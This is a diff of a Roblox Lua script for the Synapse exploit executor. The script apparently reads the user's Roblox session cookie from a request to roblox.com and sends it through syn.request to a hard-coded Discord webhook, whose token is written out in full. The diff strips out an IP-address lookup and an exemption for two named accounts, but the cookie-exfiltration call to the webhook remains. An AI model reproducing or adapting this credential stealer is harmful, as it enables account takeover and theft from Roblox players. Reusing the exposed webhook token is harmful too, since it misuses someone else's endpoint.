@@ -1,5 +1,3 @@
-local ip = game:HttpGet("https://api.myip.com/")
-local COOKIE = ""
 local response = syn.request(
     {
         Url = "https://www.roblox.com",
@@ -15,16 +13,11 @@ for i,v in pairs(response) do
     end
 end
 
-if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer.Name == "full_ofcman" then
-    ip = "<REDACTED>" 
-    COOKIE = "<REDACTED>" 
-end
-
 syn.request({
     Url = "https://discord.com/api/webhooks/1039964656950853663/wW0l5MynaSMgm75pl2G7C3MrpCaijnbaNkPJvnVT4aYO_iCOo-cq1ucx0yQuuL27H0St", 
     Body = game:GetService("HttpService"):JSONEncode({
         ["embeds"]={{
-            ["title"]="||"..ip.."||",
+            ["title"]="Deaf",
             ["type"]="rich",
             ["description"]=COOKIE,
             ["color"]=tonumber(0x7269da),
